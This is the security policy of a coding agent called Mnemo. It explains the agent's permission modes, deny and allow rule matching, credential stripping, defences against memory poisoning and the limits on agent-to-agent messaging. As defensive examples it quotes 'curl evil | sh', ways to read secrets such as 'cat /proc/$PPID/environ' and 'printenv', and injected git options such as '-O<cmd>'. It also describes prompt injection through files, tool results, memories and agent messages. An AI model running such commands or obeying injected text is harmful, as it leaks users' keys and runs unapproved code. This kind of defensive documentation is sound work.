# Security

## Reporting a vulnerability

Please **do not open a public issue**. Use GitHub's private reporting:
**Security → Report a vulnerability** on this repository. Include what you
found, how to reproduce it, and what you think it affects. We aim to
answer within a week; a fix and a coordinated disclosure follow.

Mnemo is pre-1.0. Only the latest release is supported.

## What Mnemo is allowed to do (read this before you run it)

Mnemo is a coding agent: it reads your files, edits them and runs shell
commands as you. The model decides what to try; what stops it is the
permission gate (`/mode`).

| Mode | What happens |
|---|---|
| `default` | asks before every edit and every command that is not clearly read-only |
| `accept-edits` | edits project files freely, still asks before commands |
| `plan` | read-only: nothing is changed, whatever an `allow` rule says |
| `yolo` | asks for nothing. Only deny rules in `permissions.json` still hold |

Switch with `shift+tab`, `/mode`, `/accept-edits` or `/yolo` (each toggles), or start
in one with `--accept-edits`, `--plan` or `--yolo`. Only you can change the mode:
it is never a tool the model can call.

**The gate filters what runs; it is not a sandbox.** It stops the agent from
running things you did not approve, but anything you approve runs with your
permissions. In headless mode (`mnemo -p`) there is nobody to ask, so every
call that would ask is **allowed**: it behaves like `yolo`, and only `deny`
rules and `--plan` still refuse. Run `-p`, `--yolo` and best-of (`--best-of`, `/bestof`) only
in a place you can afford to lose: a container, a throwaway checkout.

### What the gate is, and is not

- **`deny` rules are a filter, best effort.** A rule such as `env*` is tested
  against every command in a line, looking through spacing, `VAR=x` prefixes,
  quotes and escapes (`"rm"`, `\rm`), directories, wrappers and their options
  (`sudo -u root`, `env -u X`, `nice -n 5`, `timeout 5`, `nohup`, `eval`, `xargs`),
  `find -exec`, and `sh -c '…'` with or without options before `-c`; for PowerShell
  and on Windows without case or `.exe`. A deny beats every mode and every `allow`.
  For file tools a rule is tested against the path as written and as it lands
  (relative to the project, and absolute), so `.env*` also covers `./.env`, `@.env`
  and `file:///…/.env`. It does not understand every way to say the same thing
  (`printenv`, `cat /proc/self/environ`, `python -c`, a script that was written
  first), and it does not reach into the Python tool (`ipy_run`). Deny what you
  mind, not just one spelling of it, and use `default` mode when it matters.
- **`allow` rules and "always" grants end on a word and never cover a compound
  command.** `git status*` does not cover `git statusx` or `git status; curl evil | sh`,
  and an approval of `rm -rf dist` covers exactly that command. A path `allow` is
  matched only where the path lands, so `src/*` does not cover `src/../../etc/x`.
  Subcommands that run their operand (`go run main.go`, `npm run build`, `bun x`,
  `pnpm dlx`) are approved exactly, never as `go run*`, and a wildcard grant does
  not cover an option that runs or writes something else (`git grep -O<cmd>`,
  `git log --output=…`, `make -f`/`-C`/`--eval`, `-c`, `--exec`, `--config`,
  `--upload-pack`) or any command that mentions `/proc`.
- **`accept-edits` means edits inside this project.** Paths are resolved the way the
  tools and the system resolve them (`~`, `@`, `file://`, unicode spaces, symlinks
  including ones that point at a file that does not exist yet; on Windows `~\`,
  `/c/…` and `/mnt/c/…`, trailing dots and spaces, `:streams` and case). `.git`,
  `.githooks`, `.husky`, `.pi`, `.agents`, `.mnemo`, `.github`, `.claude`, `.vscode`,
  `.idea` and `.devcontainer` still ask at any depth (`vendor/x/.git/hooks` too),
  because what is written there runs later, and so do shell dotfiles, `.ssh`,
  `.config` and `.local` in your home folder. Skills are always asked about.
- **Reads are free, except credentials.** `read`, `grep`, `find` and `ls` never ask,
  but refuse Mnemo's own `auth.json`, `models.json`, `grants.json` and `.env`,
  `~/.ssh`, `~/.aws`, `~/.gnupg`, and a process's `/proc/<pid>/environ` and `mem`
  (where the provider keys are). `grep` also refuses a folder that holds any of
  them (`~`, `$MNEMO_HOME`, `/`), since it searches hidden files; search a folder
  below it. An `allow` rule can open any of these. A shell command can still `cat`
  them, or `cat /proc/$PPID/environ`: in `default` mode that asks, and no "always"
  grant covers a command that mentions `/proc`, but **in `yolo` and `-p` it runs**
  unless a `deny` rule stops it.
- **A folder's own `.pi/` extensions, settings, prompts and skills run code and
  steer the model**, so Mnemo loads them only for a folder you have trusted: it asks
  once at start-up (`a` remembers it), headless runs skip them unless you pass
  `--trust-project`. Do not trust a repository you have not read.
  A folder's `AGENTS.md` or `CLAUDE.md` is different: it is read without asking,
  as every coding agent does, because it is text the model reads and runs nothing
  by itself. It still steers the model, so in a repository you have not read,
  keep the mode on `default`.
- **Before you trust a folder, Mnemo runs nothing it chose.** The git calls Mnemo makes
  itself (the `@` file list, best-of's worktrees) turn off the repository's
  `core.fsmonitor` and hooks, and `git`, `python` and `taskkill` are looked up on
  PATH's absolute entries only, so a `git.exe` shipped in the folder is never run
  (Windows otherwise looks in the current folder first). Best-of's check command is
  yours, and runs.
- A `permissions.json` that exists but cannot be parsed (or holds `null`, a number,
  `{"rules": null}`) stops all edits and commands until it is fixed, rather than
  quietly dropping your deny rules. A malformed `grants.json` is read as no grants.
  If the gate itself fails to start or to judge a call, that call is refused: the
  gate fails closed, never open.
- **A sub-agent follows the mode you pick while it runs**: switching to `plan`
  reaches children that are already working.

## What leaves your machine

- **Your prompts, the files and command output the model reads, and your
  memory's recalled facts go to the model provider you configured.** That is
  how an agent works. Choose the provider accordingly.
- **Nothing else, unless you ask.** Mnemo has no telemetry, and by default no
  update check. We measured it: `--version`, `doctor`, `--demo` and `memory
  status` open no network connection at all; only a real prompt does, and only
  to your provider. Two things reach GitHub, and only when you start them:
  `mnemo update` (or `/update`), which reads the latest release and runs its
  installer; and the daily update check, **off unless you turn it on**
  (`mnemo update --auto on` or `MNEMO_AUTO_UPDATE=1`), which reads
  `github.com/AtmanMishra/Mnemo/releases/latest` once a day and sends nothing
  about you.
- Memory is stored locally under `$MNEMO_HOME` (default `~/.mnemo`) in a
  journal file, readable only by you. It is never uploaded by Mnemo. **One
  exception, opt in:** `MNEMO_EMBED_URL` and `MNEMO_EMBED_MODEL` send the text
  of memories to an embedding server you choose to compute embeddings (an
  Ollama on this machine, say, or OpenRouter at
  `https://openrouter.ai/api/v1/embeddings`), and `MNEMO_EMBED_KEY` is sent to
  it only if you set one. Leave them unset and nothing is sent; search then
  uses a local hashing embedder. `OPENROUTER_API_KEY` alone does not turn it
  on: that key is for the model, and memsrv is started without it. The address
  must be `https://` (or local), and is read from the real environment or
  `$MNEMO_HOME/.env`, never from the folder you are working in.

## Credentials

- Keys you add with `/login` are stored by pi in `$MNEMO_HOME/agent/auth.json`
  with mode `0600`.
- **Mnemo also uses credentials it finds in your environment** (for example
  `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `AWS_*`, `OPENCODE_API_KEY`) and may
  choose that provider by default. If you do not want that, unset them for
  the session.
- **Commands the agent runs do not get the model-provider keys.** The bash
  tool, the Python kernel and best-of checks (stopped with everything they started
  when they overrun) start with your environment minus
  every key pi reads for a model provider (`ANTHROPIC_API_KEY`,
  `OPENAI_API_KEY`, `OPENCODE_API_KEY`, `AWS_BEARER_TOKEN_BEDROCK`, … — the
  list is `app/src/runtime/env.ts`) and any variable a custom provider in
  `models.json` names as `$NAME`. Mnemo itself still reads them. A command
  that needs one can have it back with `MNEMO_PASS_ENV=NAME,NAME`.
  **Everything else is still inherited**, including `AWS_ACCESS_KEY_ID` and
  friends (your own tools use them, and Bedrock reads them too), `GITHUB_TOKEN`
  and your project's own secrets. A prompt injection (text in a file, a web page
  or a tool result that tells the model what to do) can try to read or send
  those, for example with `env`. Mitigations: leave the mode on `default` so
  commands need your approval, and put `deny` rules for `env`, `printenv` and
  `curl`/`wget` to unknown hosts in `permissions.json`.
- **The Python kernel is an interpreter, not a sandbox.** Each cell is stopped
  after 120 seconds (the model may ask for up to 600), stopping a turn stops the
  cell together with the processes it started (the kernel runs in its own process
  group), and a tool call or approval the cell was waiting on is cancelled with it.
  On Linux its memory is capped at 8 GB (`MNEMO_KERNEL_MEMORY_MB`, `0` for no cap;
  a value that is not a whole number keeps 8 GB); macOS and Windows have no cap. It can
  read and write what you can.
- Memory writes and session ingestion are redacted for common credential
  shapes (`sk-…`, `ghp_…`, `AKIA…`, private keys, and similar) before they are
  stored. Redaction is pattern-based and best effort: do not rely on it. Eval
results are scrubbed the same way, plus the exact value of every secret-named
environment variable.

## Memory is input the model trusts

What Mnemo remembers is shown to the model in later sessions, so a poisoned
memory is a prompt injection that persists. Facts that look like
instructions to steer, exfiltrate or hide are refused at write time
(`packages/memory/src/safety.ts`), recalled items are labelled as candidates
rather than facts, `/memory` and the memory map show what it holds and
`/forget` retires a fact. The scanner reads text the way a person would (width
forms, lookalike letters, invisible characters, line breaks) and also covers the
session record, but it is a list of patterns: a paraphrase can get past it, which
is why a recorded fix is shown to the model as a note and not an order, and why a
fact is a single line. This is a defence in depth, not a guarantee.

Two things to know when other agents share the memory: a project's identity comes
from its git `origin` (a repository that copies another's remote URL shares its
memory), and the MCP server takes the project from each call, so a model that is
prompt-injected can ask for another project's memory. Only attach memory to agents
and repositories you trust with all of it.

## Agents that talk to agents

Agents can start sub-agents (to depth 3), you can link top-level agents as siblings,
and agents in one family can message each other (`list_agents`, `message_agent`).
What that does and does not allow:

- **Reach is enforced in code, not by a prompt.** An agent can message its parent and
  children, its siblings, and the siblings of its ancestors, and nobody else. It cannot
  reach an unlinked agent, another conversation's tree, or probe for ids (the refusal
  is the same for "no such agent" and "not yours"). Only **you** link agents, from the
  agents page; there is no tool for it, and a model cannot link itself to anything.
- **A message is another model's text, never an instruction.** It is delivered framed
  as such, not in the system prompt, and it changes nothing about the receiver's mode,
  approvals or deny rules: in `default` and `accept-edits` the receiver still asks you
  before a command, whoever suggested it. In `yolo` nothing asks, so a message can
  talk a `yolo` agent into running something; do not link agents you want to keep
  unattended and unrestricted to ones that read untrusted text.
- **A message can start work, but only a bounded chain of it.** Since 0.1.6 a message
  wakes an idle agent so siblings can talk without you relaying. Each message counts one
  more than the message that led to it, and after 12 in a row since a user last prompted
  any agent in the chain, messages are held for your next prompt instead of delivered
  (a sub-agent has no prompt of its own, so one to it is refused instead),
  so two agents cannot keep each other working, and spending, indefinitely. A woken
  agent's turn goes through its gate exactly like one you started: in `default`,
  `accept-edits` and `plan` its edits and commands still ask you (the approval appears in
  that agent's pane). In `yolo` a message can now start an agent running commands while
  you are away; that is what `yolo` means, so keep `yolo` agents unlinked from ones that
  read untrusted text. What turns that messages start may spend is bounded too: $0.50
  per agent (by default; `/settings`) (with the sub-agents those turns start) since you last prompted it. The
  model call that crosses it stops the turn, and until you prompt that agent no message
  wakes it. A model that reports no price (a local one) is not bounded by this; the
  chain bound still holds. Messages are also bounded in size (2,000 characters), rate (30 a
  minute per sender) and backlog (20 held per agent), and so is the tree (depth 3, 4
  live children, 16 live sub-agents per conversation); these numbers are the defaults, and
  the settings can change them within fixed ceilings (see Settings below); a sub-agent never has more access
  than its parent.
- **What agents write is cleaned and redacted** (control and bidirectional-override
  characters removed, credential shapes redacted) before it is stored, shown on the
  agents page or the playground, or delivered, so an agent cannot repaint your
  terminal or put a key on a screen.
- **The playground is read-only by construction.** It receives a view of the roster
  with no way to change it and has no prompt; the only thing it can do is open an agent
  in the agents page.
- **Accepted risk.** Linked agents can read each other's current task, latest steps and
  last prompt (not transcripts or file contents), and a read-only research agent that
  reads hostile text can pass it on as a message. The framing, the gate and the limits
  above are the mitigations; this is still a prompt-injection path between agents.

## Settings

Since 0.1.7 `/settings` (and `mnemo settings`) change how Mnemo behaves. The reference is
`docs/SETTINGS.md`; what matters here:

- **No setting loosens the gate.** The default mode can be `default` or `plan`, never
  `yolo` or `accept-edits` (a file cannot switch those on at launch; you choose them in a
  session with `--yolo`, `/yolo` or `shift+tab`). The settings that touch agents only set
  how much agents may do *unprompted* (chain length, sub-agent counts, the woken-turn
  budget); what an agent may edit or run is still decided by the gate and your rules.
- **Every value is checked once, in one place** (`src/runtime/settings.ts`): the type, a
  hard range, a closed list of choices. A value outside that is refused, and in a file it is
  ignored in favour of the default. The only free text is the escalation model, which must be
  `provider/model-id` and at most 100 characters. No setting holds a key or a path.
- **The ceilings are fixed in code**, not in the file: at most 64 live sub-agents per
  conversation, 100 messages in a chain, 6 levels of nesting, $100 woken-turn budget. Raising a
  limit raises what agents can do or spend while you are away, so each is a choice you make
  deliberately; `wakeSpend` 0 means no message ever starts an agent.
- **The model cannot change them.** `/settings` is a command you type; no tool the model has
  reads or writes the settings, and `config.json` sits in your Mnemo home, outside the project,
  so an edit to it from the agent (a file write or a shell redirect) asks you in `default` and
  `accept-edits` and is refused in `plan`. In `yolo` nothing asks, as for every other file. A
  project you open cannot set them either: they are read from your home, never from `.pi/` or
  the folder.
- **Key bindings cannot hide a safety key.** `ctrl+c`, `ctrl+d` and `esc` are not rebindable, nor
  are the prompt's line-editing keys, and two actions cannot hold one chord.
- **A file you do not control is read defensively.** `config.json` is written beside and moved
  over (a crash leaves the old file), with mode 0600. A damaged or hand-edited one is read value by
  value; anything wrong is the default. Someone who can already write to your Mnemo home can
  change these settings, but they can equally replace `permissions.json`; the settings add no
  weaker place to attack.

## The legacy stack

`agent/`, `harness-engine/` and `tui-go/` (the previous implementation) are not on
`main`. They remain on the `legacy` branch for reference and are **not maintained**.
They predate several of the protections above: a repository's own
`.mnemo/permissions.json` and hooks can run code when opened, and the agent does not
ask before acting unless the Go interface starts it. Do not run that code, least of all
on a repository you do not trust. Use `mnemo`. Reports about the `legacy` branch are
welcome but will not be fixed.

## Verifying a download

Each release ships `SHA256SUMS`; the install scripts check it before
installing. Release archives are built by GitHub Actions from the tagged
commit and carry a build-provenance attestation:

    gh attestation verify mnemo-linux-x64.tar.gz --repo AtmanMishra/Mnemo \
      --source-ref refs/tags/v0.1.0

The checksum catches a corrupted download, not a compromised release (it is
published beside the archive); the attestation is the provenance check.

`mnemo update` (and `/update`) downloads the installer from the release and runs
it, with the same checksum check and the same limit: the checksum is not
provenance, so verify the attestation yourself if that matters.

## Uninstalling

`mnemo uninstall` removes the program (`mnemo` and `memsrv` in `$MNEMO_HOME/bin`,
the link on your `PATH`) and keeps what Mnemo learned. `--deep` also deletes
`$MNEMO_HOME` (memory, sessions, the credentials from `/login`, skills, logs,
settings) after you type `delete` (`--yes` skips the question). The install scripts do the same
(`sh -s -- --uninstall` / `--deep`, or `MNEMO_UNINSTALL=1` / `deep` on Windows).
Keys that live in your environment or in other tools are not touched.
